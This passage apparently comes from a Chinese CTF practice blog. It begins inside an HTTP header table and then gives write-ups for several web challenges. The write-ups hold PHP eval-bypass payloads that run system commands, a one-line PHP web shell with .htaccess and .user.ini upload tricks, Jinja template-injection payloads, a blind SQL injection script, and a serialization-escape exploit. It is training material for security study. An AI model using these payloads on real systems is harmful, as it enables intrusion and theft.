text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:user@email.com" target="_blank" rel="noopener">user@email.com</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1:</p><p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure><p>payload2:</p><p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812222109098.png" alt="image-20200812222109098"></p><p>payload3:</p><p>通过白名单和数字异或出 <code>_GET或_POST</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$list = [<span class="string">'_G'</span>,<span class="string">'ET'</span>];</span><br><span class="line"></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($t=<span class="number">0</span>;$t&lt;sizeof($list);$t++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line"></span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">if</span>($exp == $list[$t])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p><code>.hatcess</code></p><p><code>SetHandler application/x-httpd-php</code></p><p><code>图片马</code></p><p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></p><p>Nginx 可以利用 <code>.user.ini</code> 自动包含文件</p><p><code>auto_prepend_file=xx.jpg</code></p><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>禁用 <code>()</code> RCE无缘</p><p>内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>读取配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>又是一道SSTI</p><p>抓包发现 user存在SSTI注入，参考<a href="[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-PHP-%E5%AE%9E%E4%BE%8B](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#1-PHP-实例)">k0rz3n师傅的文章</a></p><p><img src="/2020/08/8月刷题记录/image-20200813101645436.png" alt="image-20200813101645436"></p><h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>扫一下目录，发现了robots.txt,直接访问hint.txt</p><p>得到 <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p><p>禁用了一下关键字</p><p><img src="/2020/08/8月刷题记录/image-20200813210653330.png" alt="image-20200813210653330"></p><p>这里 <code>username</code>传入 <code>\</code> 就会把 <code>&#39;</code>转义破坏语句结构</p><p><code>username=\&amp;password=or/**/1&gt;0#</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'\'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'     or/**/1&gt;0#'</span></span><br></pre></td></tr></table></figure><p><code>1&gt;0 返回  BJD needs to be stronger</code></p><p><code>1&lt;0 返回  You konw ,P3rh4ps needs a girl friend</code></p><p>然后写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://70c88c86-504f-479c-be1d-0324c8bcbb17.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"\\"</span>,<span class="string">"password"</span>:<span class="string">""</span>&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#print(mid)</span></span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        data[<span class="string">'password'</span>] = payload</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    last = result</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>extract($_POST);</code>导致变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"2"</span>,<span class="string">"color"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">extract(<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="keyword">array</span>(<span class="string">"year"</span>,<span class="string">"2020"</span>)));</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>所以<code>$_SESSION</code>是可控的，通过<code>filter()</code>改变序列化字符串，从而可控<code>img</code>的值</p><p>payload1:<code>值逃逸</code>，这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p><p>payload2:<code>键逃逸</code>，这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">"show_image"</span> ;</span><br><span class="line"><span class="comment">//payload1</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"_SESSION"</span>=&gt;<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,<span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span>));</span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="comment">//$b=array("_SESSION"=&gt;array("flagphp"=&gt;';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'));</span></span><br><span class="line">extract($b);</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">var_dump($serialize_info);</span><br><span class="line"></span><br><span class="line">$userinfo = unserialize($serialize_info);</span><br><span class="line">var_dump($userinfo);</span><br></pre></td></tr></table></figure><p>接着读flag就行</p><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 